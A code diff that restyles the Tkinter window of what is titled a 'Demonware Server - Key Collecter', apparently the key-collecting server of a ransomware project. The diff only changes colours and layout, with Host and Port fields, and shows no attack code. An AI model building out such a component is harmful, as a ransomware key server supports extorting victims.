@@ -8,6 +8,7 @@ class MainWindow(Tk):
         Tk.__init__(self)
         self.title(string = "Demonware Server - Key Collecter") # Set window title
         self.resizable(0,0) # Do not allow to be resized
+        self.configure(background = 'black')
         self.style = Style()
         self.style.theme_use("clam") # Set widget theme
         icon = PhotoImage(file='icon.png') # Set app icon
@@ -34,20 +35,19 @@ class MainWindow(Tk):
         #logo.grid_propagate(0)
 
         # Canvas for image
-        canvas = Canvas(self, highlightthickness=0, height = 150, width = 500)
-        canvas.grid(row=0, column=0, columnspan = 4)
+        #canvas = Canvas(self, highlightthickness=0, height = 150, width = 500)
+        #canvas.grid(row=0, column=0, columnspan = 4)
 
         photo = PhotoImage(file='logo.png')
         #photo = photo.zoom(2)
         photo = photo.subsample(4)
-        label = Label(self, image=photo)
+        label = Label(self, image=photo, background = 'black')
         label.image = photo # keep a reference!
         label.grid(row = 0, column = 0)
 
-        label2 = Label(self, image=photo)
+        label2 = Label(self, image=photo, background = 'black')
         label2.image = photo # keep a reference!
         label2.grid(row = 0, column = 3)
-
 
         # Log Frame
         result = LabelFrame(self, text = 'Log', relief = GROOVE)
@@ -66,10 +66,10 @@ class MainWindow(Tk):
         #self.options['log'].insert('1.0', 'Set Hosts, range and script, then click Scan!\n', 'bold')
 
         # Bottom input fields:
-        Label(self, text = 'Host: ').grid(row = 5, column = 0)
+        Label(self, text = 'Host: ', background = 'black', foreground = 'white').grid(row = 5, column = 0)
         Entry(self, textvariable = self.options['host']).grid(row = 5, column = 1)
 
-        Label(self, text = 'Port: ').grid(row = 5, column = 2)
+        Label(self, text = 'Port: ', background = 'black', foreground = 'white').grid(row = 5, column = 2)
         Entry(self, textvariable = self.options['port']).grid(row = 5, column = 3)
 
         # Bottom buttons
